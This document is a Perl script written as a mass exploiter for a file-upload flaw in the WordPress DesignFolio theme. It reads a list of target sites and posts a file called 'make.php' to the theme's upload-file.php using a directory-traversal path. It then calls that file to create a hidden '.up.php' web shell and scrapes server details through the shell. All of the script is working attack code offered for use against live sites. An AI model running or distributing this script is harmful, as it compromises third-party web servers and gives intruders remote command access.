#!/usr/bin/perl -w
# Wordpress Theme DesignFolio File Upload Exploiter :)
# C0ded by Mr_AnarShi-T (M-A)
# (c) Janissaries.org
# GreeT's : All Friend Specially Rab3oun :)
use strict;
use LWP::UserAgent;
use Digest::MD5 qw(md5 md5_hex);
use MIME::Base64;
use IO::Socket;
##
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}

my $useragent = randomagent();#Get a Random User Agent 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
$ua->cookie_jar({});# Cookies
$ua->timeout(10);#Time out = 10 you can change it 
$ua->agent($useragent);#agent type
flag();
print "\n[+] Enter List Of Target : ";
chomp (my $list=<>);
my $file= "make.php";# Evil File
print "[+] Started : $datestring\n";
print "[+] Evil File : $file\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test \n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        my @x = split (/\//,$web,2);
        my $host_name = $x[0];
        my $host_path = $x [1];
        my $addr = inet_ntoa((gethostbyname($host_name))[4]);
        my $digest = md5_hex($addr);
        my $dir = encode_base64('../../../../');
        print "[$i] $web \n";
        my $fuck = $ua->post("http://".$host_name."/".$host_path."/wp-content/themes/DesignFolio-Plus-master/admin/upload-file.php",
            Content_Type => 'form-data',
            Content => [ $digest => [$file] ,
            upload_path => $dir ]);
        if($fuck->content=~/success/) {
            print "[OK] Payload successfully executed\n";
            my $site = "http://".$host_name."/".$host_path;
            my $y = $ua->get ($site."/".$file."?cmd=up");
            if ($y->content=~/OK/) {
                print "[OK] Shell successfully Created \n";
                my $ee = $ua->get($site."/.up.php");
                print "\n[*] Website Info :\n";
                print "| ".$site."/.up.php\n";
                if ($ee->content=~/<\/title><b><br><br>(.*?)<br><\/b>/) {
                    print "| $1 \n";
                    if ($ee->content=~/<br><\/b><b><br><br>(.*?)<br><br><\/b><form action=/) {
                        print "| $1\n\n";
                    }
                    
                    
                }
                else { print "[No]  Faild To Get Info \n\n";}
            }
            else { print "[No]  Faild To Creat Shell \n\n";}
        }
        else { print "[No]  Faild To Execute Payload \n\n";}
    }
}
sub flag {print "\n[+] Wordpress Theme DesignFolio File Upload Exploiter \n[*] Coder => M-A\n(c) Janissaries.org\n\n";
}
